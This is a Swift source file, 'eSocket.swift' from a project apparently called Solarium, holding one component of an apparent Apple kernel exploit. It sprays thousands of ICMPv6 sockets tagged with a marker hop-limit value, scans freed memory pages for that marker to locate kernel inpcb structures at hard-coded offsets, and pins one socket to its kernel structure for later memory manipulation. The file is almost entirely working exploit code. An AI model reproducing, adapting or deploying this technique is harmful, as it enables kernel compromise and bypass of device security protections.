//
//  eSocket.swift
//  Solarium
//
//  Created by Kien Ho on 11/6/26.
//

import Foundation
import Darwin

let off_inp6_hops = 0x15c
let off_inp6_icmp6filt = 0x150

class eSocket {
    var socketFD: Int32 = 0
    var inpcbStart: vm_address_t = 0
    let start: vm_address_t
    let count: Int
    let fp: freePages
    
    init?(count: Int) {
        self.fp = freePages(count: count)!
        self.start = fp.getBase()
        self.count = count
        guard fp.grabFreePages() == true else {
            fatalError()
        }
    }
    
    private func findPattern(at ptr: vm_address_t, length: Int, byte: UInt8) -> vm_address_t? {
        let base = UnsafeRawPointer(bitPattern: UInt(ptr))!
        for i in 0..<length {
            if base.load(fromByteOffset: i, as: UInt8.self) == byte {
                return ptr + vm_address_t(i)
            }
        }
        return nil
    }
    
    private func scanCandidates(ttl: UInt8, out: inout [vm_address_t]) {
        for j in (count / 5)..<count {
            var cursor = start + pages(j)
            while cursor < start + pages(j + 1) {
                guard let hit = findPattern(at: cursor, length: Int(start + pages(j + 1) - cursor), byte: ttl) else {
                    break
                }
                let inpcb = hit - vm_address_t(off_inp6_hops)
                let filt = UnsafeRawPointer(bitPattern: UInt(inpcb + vm_address_t(off_inp6_icmp6filt)))!.loadUnaligned(as: UInt64.self)
                if filt != 0 && (filt >> 48) == 0xffff {
                    out.append(inpcb)
                }
                cursor = hit + vm_address_t(MemoryLayout<UInt8>.size)
            }
        }
    }
    
    private func matchSocket(sockets: inout [Int32], candidates: [vm_address_t]) -> (Int32, vm_address_t)? {
        var newT = 0x3b
        var oldT = 0xf7
        while let fd = sockets.popLast() {
            defer { sockets.append(fd) }
            var kr = setsockopt(fd, IPPROTO_IPV6, IPV6_UNICAST_HOPS, &newT, socklen_t(MemoryLayout<Int32>.size))
            if kr != KERN_SUCCESS {
                print("[eSocket] setsockopt() failed with error: \(String(cString: mach_error_string(kr)))")
                sockets.removeLast()
                continue
            }

            var matched: vm_address_t = 0
            for inpcb in candidates {
                let cur = UnsafeRawPointer(bitPattern: UInt(inpcb + vm_address_t(off_inp6_hops)))!.load(as: UInt8.self)
                if cur == UInt8(truncatingIfNeeded: newT) {
                    matched = inpcb
                    break
                }
            }
            setsockopt(fd, IPPROTO_IPV6, IPV6_UNICAST_HOPS, &oldT, socklen_t(MemoryLayout<Int32>.size))

            if matched != 0 {
                sockets.removeLast()
                return (fd, matched)
            }
        }
        return nil
    }
    
    func spraySockets() -> Bool{
        var socketFDs: [Int32] = []
        var inpcb: [vm_address_t] = []
        var ttl: Int32 = 0xf7
        
        defer {
            for fd in socketFDs { close(fd) }
        }
        
        for i in 0..<3000 {
            let fd = socket(AF_INET6, SOCK_DGRAM, IPPROTO_ICMPV6)
            if fd < 0 {
                print("[eSocket] socket() failed for the \(i)th socket.")
                return false
            }
            var kr = setsockopt(fd, IPPROTO_IPV6, IPV6_UNICAST_HOPS, &ttl, socklen_t(MemoryLayout<Int32>.size))
            if kr != 0 {
                print("[eSocket] setsockopt() failed with error: \(String(cString: mach_error_string(kr)))")
                close(fd)
                return false
            }
            socketFDs.append(fd)
        }
        print("[eSocket] Allocated initial socket FDs.")
        for round in 0..<5 {
            var sprayed = 0
            for _ in 0..<500 {
                let fd = socket(AF_INET6, SOCK_DGRAM, IPPROTO_ICMPV6)
                if fd < 0 {
                    print("[eSocket] socket() failed for the \(round * sprayed)th socket.")
                    return false
                }
                var kr = setsockopt(fd, IPPROTO_IPV6, IPV6_UNICAST_HOPS, &ttl, socklen_t(MemoryLayout<Int32>.size))
                if kr != 0 {
                    print("[eSocket] setsockopt() failed with error: \(String(cString: mach_error_string(kr)))")
                    close(fd)
                    return false
                }
                socketFDs.append(fd)
                sprayed += 1
            }

            scanCandidates(ttl: UInt8(ttl), out: &inpcb)

            if let (fd, inpcb) = matchSocket(sockets: &socketFDs, candidates: inpcb) {
                socketFD = fd
                inpcbStart = inpcb
                print("[eSocket] Matched fd \(fd) to inpcb 0x\(String(inpcb, radix: 16)).")
                return true
            }
            print("[eSocket] Round \(round): no match (candidates: \(inpcb.count)), retrying.")
        }
        return false
    }
}
